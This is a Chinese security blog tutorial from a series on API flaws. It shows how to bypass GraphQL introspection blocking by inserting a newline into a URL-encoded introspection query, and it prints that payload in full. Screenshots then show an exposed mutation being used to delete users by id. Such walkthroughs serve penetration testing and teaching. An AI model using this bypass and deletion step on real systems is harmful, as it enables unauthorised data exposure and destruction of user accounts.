#  【接口漏洞第八章第九节】一招绕过GraphQL内省防御：实战利用详解  
原创 升斗安全XiuXiu
                    升斗安全XiuXiu  升斗安全   2026-01-29 12:42  
  
**【文章说明】**  
- **目的**  
：本文内容仅为网络安全**技术研究与教育**  
目的而创作。  
  
- **红线**  
：严禁将本文知识用于任何**未授权**  
的非法活动。使用者必须遵守《网络安全法》等相关法律。  
  
- **责任**  
：任何对本文技术的滥用所引发的**后果自负**  
，与本公众号及作者无关。  
  
- **免责**  
：内容仅供参考，作者不对其准确性、完整性作任何担保。  
  
**阅读即代表您同意以上条款。**  
  
****  
在上一节[【接口漏洞第八章第八节】攻防升级：实战绕过GraphQL内省防御机制](https://mp.weixin.qq.com/s?__biz=MjM5MzM0MTY4OQ==&mid=2447797821&idx=1&sn=f167bb40c53818f8245cce223c6078fb&scene=21#wechat_redirect)  
中，我们分享了如何绕过内省防御机制，今天我们就结合实际场景来分享下，如何进行实际的利用。  
  
通常情况下，设置了  
GraphQL 内省防御机制的系统，请求的接口，在  
burpsuite工具的  
repeater功能中，是不会出现    
GraphQL 菜单栏的，如下面两个图，一个是开启了防御机制的，一个是没开启的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDlxGy3Dia3ljJgATyD29rHe9tbnrKibOdXGrWicUnFQ1ibk0WEKDIaPGWOVQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDluLZFPGwqWYWntJKhX7SMJ2jY3hcWz6uy1OBuyKMkueCTn6y7DibPLjQ/640?wx_fmt=png&from=appmsg "")  
  
遇到这种情况时，就需要我们手动去发现可疑的 GraphQL API 端点，比如下面这个系统，我们发现在根目录路径下，直接添加   
/api 访问目录的话，就会返回查询错误的异常提示  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDl95sRtUcBJLYYNKqCr1ZVwMJPndouCdW49Ejfo5PpYdVEoP8nwzYzyg/640?wx_fmt=png&from=appmsg "")  
  
这个时候，我们就可以尝试用前面章节中讲到的一些内容来进行深入测试验证，看是不是存在 GraphQL 自省防御了，我们直接在这个接口的请求参数中，添加自省参数   
?query=query{__typename}   
发现系统会有响应，且burpsuite工具也会自动出现对应菜单项，具体如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDluCUasYbqjj24mq46vPJ7ibAibhCJ5KVEtcXichb6YBuBJJRN66OrUjEvg/640?wx_fmt=png&from=appmsg "")  
  
虽然发现了系统是使用的  
 GraphQL api ，但系统是开启了  
自省防御的，因为通过在 GraphQL 菜单下的   
Set introspection query 功能，是无法得到接口文档明细内容的。  
  
此时根据上一章节介绍的绕过方式【换行符】，我们就可以构造如下请求来进行尝试绕过：  
```
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```  
  
发现请求后，确实可以实现绕过，且返回了文档明细内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDlfUxZy4Ewn7POalibbroUmpjF9hhtBI37kO7TggBZY9zicMIBdpksl3Rw/640?wx_fmt=png&from=appmsg "")  
  
此时我们就可以将文档结构内容直接发送到网站地图中，让burpsuite帮我们格式化下得到的文档内容，通过审查文档内容，发现存在一个可以直接删除已有用户的接口地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDl2j0VfQWrh2iciaOjnQeuBibcWia7gXkcZpIPRQickoMKYqtUYsM9PTV4vVg/640?wx_fmt=png&from=appmsg "")  
  
将这个请求发送到repeater中，直接请求的话，会发现系统会提示请求存在一些格式及语法问题  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDlQDaBPbvTvS959DephqEgFEiciaF5TG8khb7Hp1DIvIUYic8iaMLxQLqKwA/640?wx_fmt=png&from=appmsg "")  
  
这时，只需要结合使用换行符和格式调整，就可以直接通过用户的id实现用户删除的动作了，具体如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0DUw3OcToBxBJop3XLvyDlibozn2RwedYibW1Qbe4yU4RCQDkKxYUn0pRWfevFxnicsZicriaXdyeuzrQ/640?wx_fmt=png&from=appmsg "")  
  
好了，关于  
绕过  
自省防御  
的实际操作，今天就分享到这里。这边后续会继续分享api接口的相关内容，感兴趣的话，可以点点关注。  
  
觉得内容对你有用或无用，欢迎点赞或留言，这边会不断更正。  
  
